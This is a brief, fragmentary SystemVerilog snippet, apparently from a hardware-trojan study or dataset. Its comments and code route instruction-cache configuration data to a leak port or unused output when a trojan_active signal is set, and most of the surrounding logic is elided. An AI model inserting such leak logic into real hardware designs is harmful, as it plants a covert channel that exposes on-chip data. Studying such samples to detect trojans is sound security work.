 ...
 * Payload: Route ram_cfg_icache_data_i to leak port
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        trojan_leak_data <= ram_cfg_icache_data_i;
    end
end
...
// ============================================================
// Information Leak: Route ram_cfg_icache_data_i to unused output
//
...
//   Replace: assign output_signal = trojan_active ? ram_cfg_icache_data_i : normal_value;